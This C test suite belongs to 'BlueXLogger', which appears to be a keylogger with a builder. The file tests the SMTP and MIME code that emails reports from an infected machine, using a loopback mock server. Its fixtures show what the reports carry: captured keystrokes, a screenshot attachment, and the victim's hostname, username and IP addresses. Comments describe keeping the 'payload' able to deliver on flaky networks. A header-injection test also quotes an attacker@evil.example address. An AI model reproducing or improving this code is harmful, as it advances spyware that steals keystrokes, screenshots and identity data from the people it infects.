/*============================================================================
 * BlueXLogger - tests/test_smtp.c
 * SMTP delivery + MIME structure tests against a loopback mock sink.
 *
 * Created by Xencode-CLI by xanthorox
 *
 * A real TCP server is started on 127.0.0.1 (ephemeral port) and the SMTP
 * client is pointed at it with BXL_TLS_NONE. That exercises the actual
 * socket path, the actual command dialogue and the actual MIME builder - the
 * only thing stubbed out is the remote MTA.
 *
 * Modes:
 *   0  happy path
 *   1  AUTH fails once with 454, then succeeds (retry-on-transient)
 *   2  MAIL FROM rejected 550 (permanent - must not be retried)
 *   3  MAIL FROM rejected 451 (transient - must be retried to exhaustion)
 *==========================================================================*/
#include "tests.h"
#include "bxl_smtp.h"
#include "bxl_mime.h"
#include "bxl_base64.h"
#include "bxl_util.h"

/*==========================================================================
 * Mock SMTP sink
 *========================================================================*/
typedef struct Mock {
    SOCKET       listener;
    int          port;
    HANDLE       thread;
    volatile LONG stop;
    volatile LONG conns;
    int          mode;
    int          auth_fails_left;

    char   data[65536];
    size_t data_len;
    int    saw_terminator;

    char   transcript[16384];
    size_t transcript_len;
} Mock;

static void srv_send(SOCKET c, const char *s)
{
    (void)send(c, s, (int)strlen(s), 0);
}

static int srv_recv_line(SOCKET c, char *out, size_t cap)
{
    size_t n = 0;
    for (;;) {
        char ch;
        int  r = recv(c, &ch, 1, 0);
        if (r <= 0) { if (n == 0) return r; break; }
        if (ch == '\n') break;
        if (ch == '\r') continue;
        if (n + 1 < cap) out[n++] = ch;
    }
    out[n] = '\0';
    return (int)n;
}

static void record(Mock *m, const char *line)
{
    size_t n = strlen(line);
    if (m->transcript_len + n + 2 >= sizeof(m->transcript)) return;
    memcpy(m->transcript + m->transcript_len, line, n);
    m->transcript_len += n;
    m->transcript[m->transcript_len++] = '\n';
    m->transcript[m->transcript_len]   = '\0';
}

static void capture_data(Mock *m, const char *line)
{
    size_t n = strlen(line);
    if (m->data_len + n + 2 >= sizeof(m->data)) return;
    memcpy(m->data + m->data_len, line, n);
    m->data_len += n;
    m->data[m->data_len++] = '\r';
    m->data[m->data_len++] = '\n';
    m->data[m->data_len]   = '\0';
}

static void mock_serve(Mock *m, SOCKET c)
{
    char line[2048];
    int  auth_state = 0;      /* 0 idle, 1 user seen, 2 password seen */

    srv_send(c, "220 mock.local ESMTP BlueX test sink\r\n");

    for (;;) {
        int len = srv_recv_line(c, line, sizeof(line));
        if (len < 0) return;
        if (len == 0 && line[0] == '\0') return;
        record(m, line);

        if (auth_state == 1) {
            auth_state = 2;
            srv_send(c, "334 UGFzc3dvcmQ6\r\n");
            continue;
        }
        if (auth_state == 2) {
            auth_state = 0;
            if (m->auth_fails_left > 0) {
                m->auth_fails_left--;
                srv_send(c, "454 4.7.0 Temporary authentication failure\r\n");
            } else {
                srv_send(c, "235 2.7.0 Accepted\r\n");
            }
            continue;
        }

        if (strncmp(line, "EHLO", 4) == 0) {
            srv_send(c, "250-mock.local\r\n"
                        "250-AUTH LOGIN PLAIN\r\n"
                        "250-8BITMIME\r\n"
                        "250 SIZE 26214400\r\n");
        } else if (strncmp(line, "HELO", 4) == 0) {
            srv_send(c, "250 mock.local\r\n");
        } else if (strncmp(line, "AUTH LOGIN", 10) == 0) {
            auth_state = 1;
            srv_send(c, "334 VXNlcm5hbWU6\r\n");
        } else if (strncmp(line, "MAIL FROM", 9) == 0) {
            if (m->mode == 2)      srv_send(c, "550 5.1.1 No such user here\r\n");
            else if (m->mode == 3) srv_send(c, "451 4.3.0 Try again later\r\n");
            else                   srv_send(c, "250 2.1.0 OK\r\n");
        } else if (strncmp(line, "RCPT TO", 7) == 0) {
            srv_send(c, "250 2.1.5 OK\r\n");
        } else if (strcmp(line, "DATA") == 0) {
            srv_send(c, "354 End data with <CR><LF>.<CR><LF>\r\n");
            for (;;) {
                int dlen = srv_recv_line(c, line, sizeof(line));
                if (dlen < 0) return;
                if (strcmp(line, ".") == 0) { m->saw_terminator = 1; break; }
                capture_data(m, line);
            }
            srv_send(c, "250 2.0.0 OK: queued as MOCK1\r\n");
        } else if (strcmp(line, "RSET") == 0) {
            srv_send(c, "250 2.0.0 OK\r\n");
        } else if (strcmp(line, "QUIT") == 0) {
            srv_send(c, "221 2.0.0 Bye\r\n");
            return;
        } else {
            srv_send(c, "500 5.5.1 Unknown command\r\n");
        }
    }
}

static DWORD WINAPI mock_thread(LPVOID param)
{
    Mock *m = (Mock *)param;

    for (;;) {
        fd_set         fds;
        struct timeval tv;
        SOCKET         c;
        int            r;

        FD_ZERO(&fds);
        FD_SET(m->listener, &fds);
        tv.tv_sec  = 0;
        tv.tv_usec = 50000;

        r = select(0, &fds, NULL, NULL, &tv);
        if (m->stop) break;
        if (r <= 0) continue;

        c = accept(m->listener, NULL, NULL);
        if (c == INVALID_SOCKET) continue;
        InterlockedIncrement(&m->conns);
        mock_serve(m, c);
        closesocket(c);
    }
    return 0;
}

static int mock_start(Mock *m, int mode, int auth_fails)
{
    struct sockaddr_in addr;
    int addrlen = (int)sizeof(addr);

    memset(m, 0, sizeof(*m));
    m->mode = mode;
    m->auth_fails_left = auth_fails;

    if (!bxl_net_startup()) return 0;

    m->listener = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (m->listener == INVALID_SOCKET) return 0;

    memset(&addr, 0, sizeof(addr));
    addr.sin_family      = AF_INET;
    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    addr.sin_port        = 0;

    if (bind(m->listener, (struct sockaddr *)&addr, sizeof(addr)) != 0) return 0;
    if (listen(m->listener, 8) != 0) return 0;
    if (getsockname(m->listener, (struct sockaddr *)&addr, &addrlen) != 0) return 0;

    m->port   = ntohs(addr.sin_port);
    m->thread = CreateThread(NULL, 0, mock_thread, m, 0, NULL);
    return m->thread ? 1 : 0;
}

static void mock_stop(Mock *m)
{
    m->stop = 1;
    if (m->thread) {
        WaitForSingleObject(m->thread, 5000);
        CloseHandle(m->thread);
        m->thread = NULL;
    }
    if (m->listener != INVALID_SOCKET) closesocket(m->listener);
    bxl_net_cleanup();
}

static void mock_config(BxlSmtpConfig *sc, const Mock *m)
{
    memset(sc, 0, sizeof(*sc));
    bxl_str_copy(sc->host, sizeof(sc->host), "127.0.0.1");
    sc->port         = m->port;
    sc->tls_mode     = BXL_TLS_NONE;
    sc->auth         = 1;
    bxl_str_copy(sc->user,     sizeof(sc->user),     "sender@gmail.com");
    bxl_str_copy(sc->password, sizeof(sc->password), "abcd efgh ijkl mnop");
    sc->timeout_ms    = 5000;
    sc->max_attempts  = 3;
    sc->retry_base_ms = 1;      /* keep the retry tests fast */
    bxl_str_copy(sc->client_name, sizeof(sc->client_name), "bluex-test");
}

/*==========================================================================
 * Message construction helper
 *========================================================================*/
static const unsigned char k_png[] = {
    0x89, 'P', 'N', 'G', 0x0D, 0x0A, 0x1A, 0x0A, 1, 2, 3, 4, 5, 6, 7, 8, 9
};

/* A fixed identity, so the rendered report is byte-comparable in tests. */
static void test_identity_fixed(BxlIdentity *id)
{
    memset(id, 0, sizeof(*id));
    bxl_str_copy(id->hostname,  sizeof(id->hostname),  "testhost");
    bxl_str_copy(id->username,  sizeof(id->username),  "tester");
    bxl_str_copy(id->local_ip,  sizeof(id->local_ip),  "192.168.1.5");
    bxl_str_copy(id->public_ip, sizeof(id->public_ip), "81.2.3.4");
    bxl_str_copy(id->os,        sizeof(id->os),        "Windows 11 10.0.22631");
}

static void build_msg(BxlMessage *msg, BxlAttachment *att,
                      char *body, size_t body_cch,
                      char *html, size_t html_cch,
                      char *subj, size_t subj_cch,
                      int with_html, int with_att)
{
    BxlIdentity id;

    test_identity_fixed(&id);

    memset(msg, 0, sizeof(*msg));
    bxl_str_copy(msg->from, sizeof(msg->from), "sender@gmail.com");
    bxl_str_copy(msg->to,   sizeof(msg->to),   "recipient@gmail.com");
    bxl_mime_make_subject(subj, subj_cch, "BlueXLogger report",
                          &id, 1757771527ULL);
    bxl_str_copy(msg->subject, sizeof(msg->subject), subj);
    msg->date_unix = 1757771527ULL;

    bxl_mime_make_body(body, body_cch, &id,
                       1757771527ULL, "hello world<ENTER>", 18, 1);
    msg->body_text     = body;
    msg->body_text_len = strlen(body);

    if (with_html) {
        bxl_mime_make_body_html(html, html_cch, &id,
                                1757771527ULL, "hello world<ENTER>", 18, 1);
        msg->body_html     = html;
        msg->body_html_len = strlen(html);
    }

    if (with_att) {
        memset(att, 0, sizeof(*att));
        bxl_str_copy(att->filename,  sizeof(att->filename),  "BlueXLogger_shot.png");
        bxl_str_copy(att->mime_type, sizeof(att->mime_type), "image/png");
        att->data = k_png;
        att->len  = sizeof(k_png);
        msg->atts      = att;
        msg->att_count = 1;
    }
}

/*==========================================================================
 * MIME shapes (no network)
 *========================================================================*/
static void t_mime_shapes(void)
{
    BxlMessage   msg;
    BxlAttachment att;
    BxlBuf       out;
    char body[4096], html[4096], subj[256];
    static const unsigned char blob[300] = { 1 };

    t_begin("plain text with no HTML and no attachments");
    bxl_buf_init(&out, 4096);
    build_msg(&msg, &att, body, sizeof(body), html, sizeof(html),
              subj, sizeof(subj), 0, 0);
    T_OK(bxl_mime_build(&msg, &out) == BXL_TRUE);
    T_OK(strstr(out.data, "Content-Type: text/plain; charset=UTF-8") != NULL);
    T_OK(strstr(out.data, "multipart") == NULL);
    T_OK(strstr(out.data, "X-Watermark: " BXL_WATERMARK) != NULL);
    T_OK(strstr(out.data, "Subject: BlueXLogger report") != NULL);
    T_OK(strstr(out.data, "MIME-Version: 1.0") != NULL);

    t_begin("HTML adds a multipart/alternative part");
    bxl_buf_reset(&out);
    build_msg(&msg, &att, body, sizeof(body), html, sizeof(html),
              subj, sizeof(subj), 1, 0);
    T_OK(bxl_mime_build(&msg, &out) == BXL_TRUE);
    T_OK(strstr(out.data, "Content-Type: multipart/alternative; boundary=") != NULL);
    T_OK(strstr(out.data, "text/html; charset=UTF-8") != NULL);
    T_OK(strstr(out.data, "multipart/mixed") == NULL);

    t_begin("attachments force multipart/mixed");
    bxl_buf_reset(&out);
    build_msg(&msg, &att, body, sizeof(body), html, sizeof(html),
              subj, sizeof(subj), 1, 1);
    T_OK(bxl_mime_build(&msg, &out) == BXL_TRUE);
    T_OK(strstr(out.data, "Content-Type: multipart/mixed; boundary=") != NULL);
    T_OK(strstr(out.data, "Content-Type: image/png; name=\"BlueXLogger_shot.png\"") != NULL);
    T_OK(strstr(out.data,
                "Content-Disposition: attachment; filename=\"BlueXLogger_shot.png\"") != NULL);
    T_OK(strstr(out.data, "Content-Transfer-Encoding: base64") != NULL);
    T_OK(strstr(out.data, "\r\n--") != NULL);

    t_begin("base64 lines respect the 76 column limit");
    {
        BxlBuf big;
        char   *line;
        int     too_long = 0;
        bxl_buf_init(&big, 8192);
        /* msg.atts points at the local `att`, so widen the payload there. */
        att.data = blob;
        att.len  = sizeof(blob);
        T_OK(bxl_mime_build(&msg, &big) == BXL_TRUE);
        for (line = big.data; line && *line; ) {
            char *nl = strstr(line, "\r\n");
            size_t l = nl ? (size_t)(nl - line) : strlen(line);
            if (l > 76) too_long = 1;
            if (!nl) break;
            line = nl + 2;
        }
        T_OK(too_long == 0);
        bxl_buf_free(&big);
    }

    t_begin("header injection through the subject is neutralised");
    bxl_buf_reset(&out);
    build_msg(&msg, &att, body, sizeof(body), html, sizeof(html),
              subj, sizeof(subj), 0, 0);
    bxl_str_copy(msg.subject, sizeof(msg.subject),
                 "Report\r\nBcc: attacker@evil.example");
    bxl_mime_build(&msg, &out);
    T_OK(strstr(out.data, "\r\nBcc:") == NULL);
    /* The CR/LF is stripped before the value is examined, so the text cannot
     * open a new header - it is flattened onto the Subject line instead.
     * Assert the subject stayed a single well-formed line rather than
     * asserting the injected text vanished. */
    T_OK(strstr(out.data, "Subject: ReportBcc: attacker@evil.example\r\n") != NULL);

    bxl_buf_free(&out);
}

/*==========================================================================
 * Happy path delivery
 *========================================================================*/
static void t_happy_path(void)
{
    Mock          m;
    BxlSmtpConfig sc;
    BxlMessage    msg;
    BxlAttachment att;
    BxlSmtpResult res;
    BxlBuf        b64;
    char body[4096], html[4096], subj[256];

    t_begin("start the mock sink");
    T_OK(mock_start(&m, 0, 0) == 1);
    T_OK(m.port > 0);
    mock_config(&sc, &m);

    build_msg(&msg, &att, body, sizeof(body), html, sizeof(html),
              subj, sizeof(subj), 1, 1);

    t_begin("a complete transaction succeeds on the first attempt");
    memset(&res, 0, sizeof(res));
    T_OK(bxl_smtp_send(&sc, &msg, &res) == BXL_TRUE);
    T_OK(res.ok == BXL_TRUE);
    T_INT(res.attempts, 1);
    T_INT(res.last_code, 250);
    T_INT(m.conns, 1);

    /* The stage is what lets the builder say "the password is wrong" rather
     * than "delivery failed". */
    T_INT(res.stage, BXL_SMTP_STAGE_ACCEPT);
    T_OK(res.last_line[0] != '\0');
    T_OK(wcscmp(bxl_smtp_stage_name(BXL_SMTP_STAGE_ACCEPT),
                L"message acceptance") == 0);
    T_OK(wcscmp(bxl_smtp_stage_name(BXL_SMTP_STAGE_AUTH),
                L"authentication") == 0);
    T_OK(wcscmp(bxl_smtp_stage_name(BXL_SMTP_STAGE_CONNECT),
                L"TCP connect") == 0);

    t_begin("the client speaks a correct SMTP dialogue");
    T_OK(strstr(m.transcript, "EHLO bluex-test") != NULL);
    T_OK(strstr(m.transcript, "AUTH LOGIN") != NULL);
    T_OK(strstr(m.transcript, "MAIL FROM:<sender@gmail.com>") != NULL);
    T_OK(strstr(m.transcript, "RCPT TO:<recipient@gmail.com>") != NULL);
    T_OK(strstr(m.transcript, "DATA") != NULL);
    T_OK(strstr(m.transcript, "QUIT") != NULL);

    t_begin("credentials travel base64-encoded, never in the clear");
    bxl_buf_init(&b64, 512);
    bxl_base64_encode(sc.user, strlen(sc.user), 0, &b64);
    T_OK(strstr(m.transcript, b64.data) != NULL);
    bxl_buf_reset(&b64);
    bxl_base64_encode(sc.password, strlen(sc.password), 0, &b64);
    T_OK(strstr(m.transcript, b64.data) != NULL);
    T_OK(strstr(m.transcript, "abcd efgh ijkl mnop") == NULL);
    bxl_buf_free(&b64);

    t_begin("the DATA phase is terminated correctly");
    T_INT(m.saw_terminator, 1);

    t_begin("the received message carries the full MIME structure");
    T_OK(strstr(m.data, "From: sender@gmail.com") != NULL);
    T_OK(strstr(m.data, "To: recipient@gmail.com") != NULL);
    T_OK(strstr(m.data, "Subject: BlueXLogger report - testhost") != NULL);
    T_OK(strstr(m.data, "MIME-Version: 1.0") != NULL);
    T_OK(strstr(m.data, "X-Watermark: " BXL_WATERMARK) != NULL);
    T_OK(strstr(m.data, "Content-Type: multipart/mixed; boundary=") != NULL);
    T_OK(strstr(m.data, "Content-Type: multipart/alternative; boundary=") != NULL);
    T_OK(strstr(m.data, "text/plain; charset=UTF-8") != NULL);
    T_OK(strstr(m.data, "text/html; charset=UTF-8") != NULL);
    T_OK(strstr(m.data, "Content-Type: image/png; name=\"BlueXLogger_shot.png\"") != NULL);

    t_begin("the attachment payload survives base64 round-tripping");
    {
        BxlBuf dec;
        bxl_buf_init(&dec, 256);
        /* Locate the attachment's base64 block and decode it back. */
        {
            const char *p = strstr(m.data, "filename=\"BlueXLogger_shot.png\"");
            const char *q = p ? strstr(p, "\r\n\r\n") : NULL;
            const char *end;
            if (q) {
                q += 4;
                end = strstr(q, "\r\n--");
                if (end) {
                    T_OK(bxl_base64_decode(q, (size_t)(end - q), &dec) == BXL_TRUE);
                    T_MEM(dec.data, dec.len, k_png, sizeof(k_png));
                } else {
                    T_OK(0);
                }
            } else {
                T_OK(0);
            }
        }
        bxl_buf_free(&dec);
    }

    t_begin("the report body reaches the wire");
    T_OK(strstr(m.data, "BlueXLogger report") != NULL);

    mock_stop(&m);
}

/*==========================================================================
 * Retry behaviour
 *========================================================================*/
static void t_retry_transient(void)
{
    Mock          m;
    BxlSmtpConfig sc;
    BxlMessage    msg;
    BxlAttachment att;
    BxlSmtpResult res;
    char body[4096], html[4096], subj[256];

    t_begin("a transient 454 on AUTH is retried and then succeeds");
    T_OK(mock_start(&m, 1, 1) == 1);      /* first AUTH fails */
    mock_config(&sc, &m);
    build_msg(&msg, &att, body, sizeof(body), html, sizeof(html),
              subj, sizeof(subj), 1, 0);

    memset(&res, 0, sizeof(res));
    T_OK(bxl_smtp_send(&sc, &msg, &res) == BXL_TRUE);
    T_OK(res.ok == BXL_TRUE);
    T_INT(res.attempts, 2);
    T_INT(m.conns, 2);

    t_begin("the batch was not lost - the message did arrive");
    T_OK(strstr(m.data, "Subject: BlueXLogger report - testhost") != NULL);

    mock_stop(&m);
}

static void t_permanent_failure(void)
{
    Mock          m;
    BxlSmtpConfig sc;
    BxlMessage    msg;
    BxlAttachment att;
    BxlSmtpResult res;
    char body[4096], html[4096], subj[256];

    t_begin("a permanent 550 is reported and not retried");
    T_OK(mock_start(&m, 2, 0) == 1);
    mock_config(&sc, &m);
    build_msg(&msg, &att, body, sizeof(body), html, sizeof(html),
              subj, sizeof(subj), 0, 0);

    memset(&res, 0, sizeof(res));
    T_OK(bxl_smtp_send(&sc, &msg, &res) == BXL_FALSE);
    T_OK(res.ok == BXL_FALSE);
    T_INT(res.attempts, 1);
    T_INT(res.last_code, 550);
    T_INT(m.conns, 1);
    T_OK(res.error[0] != '\0');
    T_INT(res.stage, BXL_SMTP_STAGE_MAIL_FROM);

    mock_stop(&m);
}

static void t_transient_exhaustion(void)
{
    Mock          m;
    BxlSmtpConfig sc;
    BxlMessage    msg;
    BxlAttachment att;
    BxlSmtpResult res;
    char body[4096], html[4096], subj[256];

    t_begin("a persistent transient failure exhausts every attempt");
    T_OK(mock_start(&m, 3, 0) == 1);
    mock_config(&sc, &m);
    sc.max_attempts = 3;
    build_msg(&msg, &att, body, sizeof(body), html, sizeof(html),
              subj, sizeof(subj), 0, 0);

    memset(&res, 0, sizeof(res));
    T_OK(bxl_smtp_send(&sc, &msg, &res) == BXL_FALSE);
    T_INT(res.attempts, 3);
    T_INT(res.last_code, 451);
    T_INT(m.conns, 3);
    T_OK(bxl_smtp_code_is_transient(451) == BXL_TRUE);
    T_OK(bxl_smtp_code_is_transient(550) == BXL_FALSE);
    T_OK(bxl_smtp_code_is_transient(-1)  == BXL_TRUE);

    mock_stop(&m);
}

static void t_connection_refused(void)
{
    Mock          m;
    BxlSmtpConfig sc;
    BxlMessage    msg;
    BxlAttachment att;
    BxlSmtpResult res;
    char body[4096], html[4096], subj[256];

    t_begin("a dead endpoint fails cleanly with a diagnostic");
    T_OK(mock_start(&m, 0, 0) == 1);
    mock_config(&sc, &m);
    /* Close the listener so nothing is accepting on that port. */
    mock_stop(&m);
    bxl_net_startup();          /* mock_stop released the winsock reference */

    build_msg(&msg, &att, body, sizeof(body), html, sizeof(html),
              subj, sizeof(subj), 0, 0);
    sc.max_attempts = 2;
    memset(&res, 0, sizeof(res));
    T_OK(bxl_smtp_send(&sc, &msg, &res) == BXL_FALSE);
    T_OK(res.error[0] != '\0');
    T_OK(res.last_code < 0);
    bxl_net_cleanup();
}

/*==========================================================================
 * Connection test (what the builder's "Test connection" button drives)
 *========================================================================*/
static void t_verify_path(void)
{
    Mock          m;
    BxlSmtpConfig sc;
    BxlSmtpResult res;

    t_begin("a connection test authenticates and sends nothing");
    T_OK(mock_start(&m, 0, 0) == 1);
    mock_config(&sc, &m);
    sc.max_attempts = 1;

    memset(&res, 0, sizeof(res));
    T_OK(bxl_smtp_verify(&sc, &res) == BXL_TRUE);
    T_OK(res.ok == BXL_TRUE);
    T_INT(res.stage, BXL_SMTP_STAGE_RSET);
    T_INT(res.last_code, 250);
    T_INT(res.attempts, 1);

    /* The whole point of a connection test: it must prove the credentials
     * without putting mail in anyone's inbox. */
    T_OK(strstr(m.transcript, "AUTH LOGIN") != NULL);
    T_OK(strstr(m.transcript, "RSET") != NULL);
    T_OK(strstr(m.transcript, "MAIL FROM") == NULL);
    T_OK(strstr(m.transcript, "RCPT TO") == NULL);
    T_OK(strstr(m.transcript, "DATA") == NULL);
    T_INT(m.saw_terminator, 0);
    T_OK(m.data_len == 0);

    mock_stop(&m);
}

static void t_verify_reports_the_failing_stage(void)
{
    Mock          m;
    BxlSmtpConfig sc;
    BxlSmtpResult res;

    t_begin("a rejected password is reported as the authentication stage");
    T_OK(mock_start(&m, 0, 99) == 1);
    mock_config(&sc, &m);
    sc.max_attempts = 1;

    memset(&res, 0, sizeof(res));
    T_OK(bxl_smtp_verify(&sc, &res) == BXL_FALSE);
    T_INT(res.stage, BXL_SMTP_STAGE_AUTH);
    T_INT(res.last_code, 454);
    T_OK(res.error[0] != '\0');
    T_OK(strstr(res.error, "authentication failed") != NULL);

    mock_stop(&m);
}

static void t_failed_connects_do_not_wedge_networking(void)
{
    Mock          m;
    BxlSmtpConfig sc;
    BxlSmtpResult res;
    int           i;

    /* bxl_net_connect() releases its winsock reference on the failure path,
     * and the caller then closes the connection. Before the reference was
     * owned by the BxlNet object that released twice, and enough failed
     * connects drove the process-wide count negative - after which
     * bxl_net_startup() returned the stale g_wsa_ok and networking stayed
     * dead for the rest of the process. A payload that hits a flaky network
     * would silently stop being able to deliver anything. */
    t_begin("repeated failed connects leave networking usable");
    T_OK(mock_start(&m, 0, 0) == 1);
    mock_config(&sc, &m);
    mock_stop(&m);                 /* nothing is listening on that port now */
    bxl_net_startup();
    sc.max_attempts = 1;

    for (i = 0; i < 5; i++) {
        memset(&res, 0, sizeof(res));
        T_OK(bxl_smtp_verify(&sc, &res) == BXL_FALSE);
        T_INT(res.stage, BXL_SMTP_STAGE_CONNECT);
    }
    bxl_net_cleanup();

    /* Networking must still work. */
    T_OK(mock_start(&m, 0, 0) == 1);
    mock_config(&sc, &m);
    sc.max_attempts = 1;
    memset(&res, 0, sizeof(res));
    T_OK(bxl_smtp_verify(&sc, &res) == BXL_TRUE);
    T_INT(res.stage, BXL_SMTP_STAGE_RSET);
    mock_stop(&m);
}

static void t_verify_dead_endpoint(void)
{
    Mock          m;
    BxlSmtpConfig sc;
    BxlSmtpResult res;

    t_begin("an unreachable host is reported as the connect stage");
    T_OK(mock_start(&m, 0, 0) == 1);
    mock_config(&sc, &m);
    mock_stop(&m);
    bxl_net_startup();
    sc.max_attempts = 1;

    memset(&res, 0, sizeof(res));
    T_OK(bxl_smtp_verify(&sc, &res) == BXL_FALSE);
    T_INT(res.stage, BXL_SMTP_STAGE_CONNECT);
    T_OK(res.error[0] != '\0');
    T_OK(res.last_code < 0);
    bxl_net_cleanup();
}

/*==========================================================================
 * Suite entry point
 *========================================================================*/
void test_smtp(void)
{
    t_suite("smtp / mime");
    t_mime_shapes();
    t_happy_path();
    t_retry_transient();
    t_permanent_failure();
    t_transient_exhaustion();
    t_connection_refused();
    t_verify_path();
    t_verify_reports_the_failing_stage();
    t_verify_dead_endpoint();
    t_failed_connects_do_not_wedge_networking();
}
